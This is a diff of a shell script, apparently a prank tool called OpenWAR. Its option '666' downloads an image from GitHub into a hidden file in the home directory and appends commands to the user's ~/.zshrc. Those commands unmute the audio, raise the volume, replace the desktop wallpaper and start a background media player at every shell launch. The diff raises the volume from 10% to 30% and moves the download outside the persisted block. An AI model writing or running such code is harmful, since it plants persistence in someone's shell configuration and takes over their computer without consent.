@@ -148,12 +148,12 @@ while true; do
   666)
 	# curl -o ~/._kagebunshinnojutsu https://raw.githubusercontent.com/murmurlab/OpenWAR/refs/heads/main/IMG_0581.jpg
     filewp=~/._kagebunshinnojutsu
+	curl -o $filewp https://raw.githubusercontent.com/murmurlab/OpenWAR/refs/heads/main/IMG_0581.jpg
 	# set wallpaper
 	echo "" >> ~/.zshrc
 	echo "
-		curl -o $filewp https://raw.githubusercontent.com/murmurlab/OpenWAR/refs/heads/main/IMG_0581.jpg
 		amixer set Master unmute
-		amixer set Master 10%
+		amixer set Master 30%
 		gsettings set org.gnome.desktop.background picture-uri $filewp
 		gsettings set org.gnome.desktop.background picture-uri-dark $filewp
 		nohup nvlc ~/libft.h &
